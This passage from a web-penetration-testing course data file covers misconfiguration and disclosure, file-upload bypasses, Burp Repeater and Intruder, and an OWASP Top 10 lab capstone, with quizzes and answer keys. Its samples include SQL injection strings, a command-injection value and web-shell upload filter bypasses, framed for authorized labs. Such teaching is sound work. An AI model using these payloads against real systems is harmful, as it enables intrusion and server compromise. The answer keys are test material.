- **Secrets in client-side code** — API keys, endpoints, credentials in JavaScript or comments.
- **Metadata leaks** — verbose headers (\`Server\`, \`X-Powered-By\` revealing exact versions), error pages, and API responses returning more data than the UI shows.
- **Directory listing** — a mis-set server showing all files in a folder.

## Why these matter

Individually some seem minor, but they **compound**: a stack trace reveals the framework, whose known CVE you then exploit; an exposed \`.git\` gives you the source to read for other bugs; a leaked API key is direct access. Misconfig and disclosure are often the *enablers* that turn a hard target into an easy one — and sometimes the whole compromise (a public S3 bucket of customer data needs no exploit at all).

## How to find them

Content discovery (\`/.git\`, backups, \`.env\`), reading responses/headers/JS carefully, triggering errors to see stack traces, checking versions, and testing for default credentials. Much of it is *noticing*, not exploiting.

## The fix (the mirror)

- **Harden**: change defaults, disable unneeded features, custom error pages (no stack traces to users), all security headers, least-privilege permissions, lock down cloud storage.
- **Don't expose**: keep \`.git\`/backups/\`.env\` out of the webroot, strip secrets from client code, patch components.

In the lab, find an exposed file or verbose error in your target and note what it reveals and how it enables a next step.`,
      sample: {
        lang: 'text',
        caption: 'Misconfiguration & disclosure: small leaks that compound',
        code: `MISCONFIGURATION                 INFORMATION DISCLOSURE
default creds (admin/admin)      /.git/  -> full source history
debug/admin endpoints on         backups (.bak .zip), .env (secrets)
verbose stack traces             API keys/endpoints in JS + comments
missing security headers         Server / X-Powered-By exact versions
public S3 bucket / bad CORS      directory listing; over-returning APIs
outdated components (known CVEs)  error pages leaking paths/queries`,
        output: `These COMPOUND: a stack trace names the framework -> exploit its
CVE; exposed .git = read the source for more bugs; a leaked key =
direct access; a public bucket = data breach with NO exploit.
Mostly found by NOTICING. Fix: harden defaults/headers/errors/
permissions; keep .git/backups/.env/secrets out of reach; patch.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why are security misconfiguration and information disclosure findings often more impactful than they first appear?',
        options: [
          'They are never impactful and can be safely ignored',
          'Because they compound — a verbose stack trace reveals a framework whose known CVE you then exploit, an exposed /.git gives you the source to find more bugs, a leaked API key is direct access, and a public storage bucket can be a full data breach with no exploit at all — so they enable or become the compromise',
          'Because they can only be found with expensive commercial scanners',
          'Because they always require chaining with SQL injection',
        ],
        answer: 1,
        explain:
          'Individually, a stack trace or a missing header can look minor, but these issues compound and enable other attacks. A verbose error reveals the exact framework and version, pointing you at a known CVE to exploit; an exposed /.git directory hands you the full source history to mine for further vulnerabilities; a secret leaked in client-side JavaScript or an .env file is often direct access; and a misconfigured public cloud bucket can be a complete data breach requiring no exploit whatsoever. So misconfiguration and disclosure are frequently the enablers that turn a hard target into an easy one — or the entire compromise by themselves. Much of finding them is careful noticing (content discovery for exposed files, reading headers/JS, triggering errors), not sophisticated tooling, and the fixes are hardening and not exposing sensitive artifacts.',
        hint: 'Think about what a stack trace, an exposed .git, a leaked key, and a public bucket each let an attacker do *next*.',
      },
    },

    {
      id: 'rweb-a-10',
      title: 'File upload vulnerabilities',
      read: `Features that let users **upload files** (avatars, documents, images) are a classic high-risk surface: if the app doesn't handle uploads safely, they can lead to code execution on the server or other serious attacks.

## The worst case: web shell upload

If an app lets you upload a file and then **serves it back as executable code**, you can upload a **web shell** — a small script (e.g. a PHP file) that runs commands on the server. Upload \`shell.php\`, browse to it, and you have remote code execution. This is why file upload is treated so seriously: it's a direct path to server compromise.

For this to work, two things must fail: the app must (1) accept a dangerous file type, and (2) store it somewhere it will be *executed* when requested.

## The bypasses testers try

Apps often try to block dangerous uploads, and testers probe those controls:

- **Extension filtering** — blocked \`.php\`? Try \`.php5\`, \`.phtml\`, \`.php.jpg\`, double extensions, case tricks (\`.PhP\`), or a trailing dot/null byte on old stacks.
- **Content-Type check** — the client-sent \`Content-Type\` header is attacker-controlled; set it to \`image/jpeg\` while uploading a script.
- **Magic-byte / content check** — prepend valid image bytes (a GIF header) to a polyglot file that is *also* valid script.
- **Where it lands** — even a valid image is a problem if the upload directory executes scripts, or if you can control the path (path traversal in the filename) to place it in an executable location.

## Beyond code execution

Uploads cause other issues too: **XSS** via an uploaded HTML/SVG file served inline; **denial of service** via huge files (zip bombs); **overwriting** critical files via path traversal in the filename; **malware distribution** if the app serves user files to others.

## The fix (the mirror)

- **Validate type by content**, not just extension or client Content-Type; **allowlist** permitted types.
- **Store uploads outside the webroot** (or on a separate domain) and **serve them non-executably** (never let the upload dir run scripts).
- **Rename files** to a random server-generated name (defeats path/extension tricks), enforce size limits, and set correct \`Content-Type\`/\`Content-Disposition\` on download.

"Upload accepted and served executably" → "validate by content, store outside webroot, serve non-executable, rename" is the finding. In the lab, upload a web shell to DVWA (its upload exercises), bypassing a naive filter, then note each control that would have stopped you.`,
      sample: {
        lang: 'text',
        caption: 'File-upload filter bypasses and why they work',
        code: `GOAL: get an executable script accepted AND served executably.

BYPASSES (when a naive filter blocks .php):
  extension: shell.php5 / shell.phtml / shell.php.jpg / shell.PhP
  Content-Type: set header to image/jpeg (it's attacker-controlled)
  magic bytes: GIF89a<?php ...?>  (valid image header + script)
  path: filename ../../ to land it in an executable dir

Then browse to the uploaded file -> it runs = web shell = RCE.`,
        output: `File upload -> web shell -> remote code execution (worst case).
Also: stored XSS (HTML/SVG), DoS (zip bombs), overwrite via path
traversal. Fix: validate by CONTENT + allowlist, store OUTSIDE
webroot + serve NON-executable, RENAME to random, size limits.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is relying on the client-supplied Content-Type header (or the file extension) to validate an upload insufficient?',
        options: [
          'Because Content-Type headers are always encrypted',
          'Because both the extension and the client-sent Content-Type are attacker-controlled and easily forged (e.g. sending a script with Content-Type: image/jpeg, or naming it shell.php.jpg), so validation must be by actual file content plus an allowlist — and the file stored outside the webroot and served non-executably',
          'Because Content-Type validation is slow',
          'Because extensions are case-sensitive and cannot be checked',
        ],
        answer: 1,
        explain:
          'File extensions and the Content-Type header are part of the request, which the attacker fully controls — so a malicious script can be named to slip past extension filters (shell.php5, shell.phtml, shell.php.jpg, shell.PhP) and sent with a forged Content-Type like image/jpeg. Neither is trustworthy evidence of what the file actually is. Robust validation checks the real content (and allowlists only the types you intend to accept), but content checks alone can be defeated by polyglots, so the stronger controls are architectural: store uploads outside the webroot (or on a separate domain), serve them non-executably so an uploaded script never runs, rename files to a random server-generated name (defeating extension/path tricks), and enforce size limits. The danger is that an accepted, executable upload becomes a web shell and thus remote code execution.',
        hint: 'Who sets the extension and the Content-Type header, and can they lie? What must you check instead?',
      },
    },

    {
      id: 'rweb-a-11',
      title: 'Using Burp effectively',
      read: `You have the vulnerability classes; now sharpen the tool. **Burp Suite** (or ZAP) is where you actually do the work, and two features — **Repeater** and **Intruder** — turn concepts into efficient testing. (All against authorized targets.)

## Repeater: manual probing, perfected

**Repeater** lets you take any request and resend it repeatedly with modifications, seeing each response. It is the workhorse of manual testing:

- Send a request from the proxy history to Repeater.
- Tweak one thing — a parameter value, a header, a payload — and resend.
- Compare responses to understand the app's behaviour.

This is how you *methodically* test an input: try \`'\` (SQLi probe), then \`' OR '1'='1\`, then \`admin'--\`, watching each response — or step an IDOR through ids, or refine an XSS payload for a context. Repeater makes the "hypothesise → probe → read response → refine" loop fast and precise.

## Intruder: automating payloads

**Intruder** automates sending *many* payloads into chosen positions in a request. You mark where payloads go and supply a payload list; Intruder fires them and tabulates the responses (status, length, timing) so anomalies stand out. Uses:

- **Fuzzing** a parameter with many injection payloads to find which trigger errors/behaviour.
- **Brute forcing / password spraying** a login (mind lockout and scope).
- **Enumeration** — cycling IDs for IDOR, usernames for enumeration.
- **Finding the odd one out** — sort by response length/status to spot the payload that behaved differently (e.g. the valid credential, the injectable parameter).

(Burp Community throttles Intruder; ZAP's fuzzer or the Pro version are faster — the concept is identical.)

## Reading results

The skill is interpreting responses at scale: a different **status code**, a different **response length**, or a different **response time** flags the interesting request. Anomaly-spotting across many responses is how automated probing finds the needle.

## The workflow

Map in the proxy → isolate an interesting request → probe it manually in Repeater → automate breadth with Intruder → confirm findings back in Repeater. That loop, applied with the vulnerability knowledge from this level, *is* practical web testing. In the lab, use Repeater to walk a SQLi through its probes, and Intruder to fuzz a parameter and spot the anomalous response.`,
      sample: {
        lang: 'text',
        caption: 'Repeater for depth, Intruder for breadth',
        code: `REPEATER (one request, many manual tweaks - the probing loop):
  send  q='            -> 500 error?      (SQLi lead)
  send  q=' OR '1'='1  -> more rows?       (confirm)
  send  q=admin'--     -> logged in?       (exploit)

INTRUDER (many payloads, auto-fired, tabulated):
  mark a position:  /account/§id§
  payloads: 1000..1010   -> compare response LENGTH/STATUS
  the odd length/status = the interesting hit (IDOR / valid cred)`,
        output: `Repeater = manual depth (hypothesise->probe->read->refine).
Intruder = automated breadth (fuzz, brute, enumerate) with results
tabulated so ANOMALIES (status/length/time) stand out. Workflow:
map -> isolate -> Repeater -> Intruder -> confirm. Authorized only;
mind lockout/scope.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'When using Burp Intruder to fire many payloads into a parameter, how do you identify the interesting request among hundreds of responses?',
        options: [
          'Intruder automatically exploits whichever payload works',
          'By spotting anomalies in the tabulated responses — a differing status code, response length, or response time flags the payload that behaved differently (e.g. the injectable input, the valid credential, or the accessible object)',
          'Every payload produces an identical response, so you pick at random',
          'By reading the full body of all responses one by one, always',
        ],
        answer: 1,
        explain:
          'Intruder automates sending many payloads into marked positions and tabulates each response’s metadata — status code, response length, and timing. The interesting request is the anomaly: a payload that yields a different status (e.g. 200 instead of 401), a different response length (a longer body meaning more data returned, or an error message), or a different response time (a time-based blind injection). Sorting or scanning by those columns makes the "odd one out" jump out — the injectable parameter, the valid credential in a spray, or the accessible object id in IDOR enumeration. Intruder does not exploit anything for you; it fires payloads and reports, and your skill is interpreting the responses at scale. Repeater then confirms the anomaly manually. Use it only against authorized targets, mindful of lockout and scope.',
        hint: 'Intruder tabulates response status, length and time — what does the "different" one usually indicate?',
      },
    },

    {
      id: 'rweb-a-12',
      title: 'Project: exploit the core Top 10',
      read: `Your amateur capstone puts the core OWASP Top 10 into practice on a deliberately vulnerable app: find, exploit, and report multiple vulnerability classes, using Burp throughout. Local lab / authorized only.

## The brief

On Juice Shop, DVWA, or WebGoat, work through the core classes from this level. For each, find an instance, prove it with a least-intrusive demonstration, understand *why* it works at the input-flow/authorization level, and write a professional finding with a fix.

## Target classes (aim for at least five, spanning injection, access control, and client-side)

1. **XSS** — find and prove one type (reflected, stored, or DOM), noting the context.
2. **SQL injection** — bypass a login *and* extract data with a UNION (or via sqlmap, then verify).
3. **Command injection** — find an input reaching a shell; confirm with timing/out-of-band.
4. **Broken access control / IDOR** — access another user's object by changing an id, or reach an admin function as a normal user.
5. **Authentication / session** — demonstrate username enumeration, missing lockout, insecure cookie flags, or broken logout.
6. **CSRF** — build an auto-submitting exploit page for a state-changing action.
7. **Misconfiguration / disclosure** — find an exposed file, verbose error, or missing headers.
8. **File upload** — upload a web shell past a naive filter (in DVWA's upload exercise).

## Use the tools

Do it through Burp: map in the proxy, probe in Repeater, automate with Intruder. Capture the raw requests as evidence for your findings.

## The standard

You pass when you have: at least five distinct vulnerability classes found and *proven* with least-intrusive payloads; each *explained* at the mechanism level (where the input flows / what check is missing); and each written up as a professional, reproducible finding (title/category, severity, exact steps with the raw request, impact, remediation), prioritised by risk. All in the local lab, nothing destructive, no real data exfiltrated.

## Where next

Intermediate goes deeper: blind and time-based SQLi, SSRF, XXE, insecure deserialization, advanced XSS and filter bypass, business-logic flaws, API and JWT attacks, and content discovery in depth — the vulnerabilities beyond the surface-level Top 10. Everything there builds on the input-flow thinking, tooling, and reporting you have now practised across the core classes.`,
      sample: {
        lang: 'text',
        caption: 'The amateur project: prove the core Top 10 (lab only)',
        code: `PROVE >= 5 CLASSES, each with a least-intrusive payload + a finding:
  XSS         <b>test</b> -> alert(1)          (note the context)
  SQLi        admin'-- (bypass) + UNION dump    (verify sqlmap)
  cmd inj     8.8.8.8; sleep 5                  (timing confirm)
  IDOR        change /account/1005 -> 1006      (ownership missing)
  auth/sess   username enum / cookie flags / logout
  CSRF        auto-submitting exploit page
  misconfig   exposed /.git or verbose error
  upload      web shell past a naive filter (DVWA)`,
        output: `Pass = >=5 distinct classes FOUND + PROVEN (least-intrusive) +
EXPLAINED at the mechanism level + written as professional,
reproducible, prioritised findings with fixes. Through Burp, in
the local lab, nothing destructive, no real data taken.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'What is the passing standard for the amateur web capstone?',
        options: [
          'Exploiting a single vulnerability as destructively as possible',
          'At least five distinct vulnerability classes found and proven with least-intrusive payloads, each explained at the mechanism level (where input flows / what check is missing) and written up as professional, reproducible, prioritised findings with fixes — all in the local lab, nothing destructive',
          'Running an automated scanner and pasting its raw output',
          'Finding vulnerabilities on a live production site for realism',
        ],
        answer: 1,
        explain:
          'The amateur capstone demonstrates breadth across the core OWASP Top 10, responsibly. Passing means finding at least five distinct vulnerability classes (spanning injection, access control, and client-side), proving each with a least-intrusive demonstration rather than a destructive one, explaining each at the mechanism level (where the input flows for injections; what authorization check is missing for access control), and writing each as a professional, reproducible finding — title/category, severity, exact reproduction with the raw request, impact, and remediation — prioritised by real risk. It is done through Burp (map, Repeater, Intruder) in the local lab, with nothing destructive and no real data exfiltrated. Pasting unverified scanner output or testing a live production site would both fail the standard.',
        hint: 'The goal is demonstrated breadth done responsibly — how many classes, proven how, explained how, and where?',
      },
    },
  ],
}

export default level
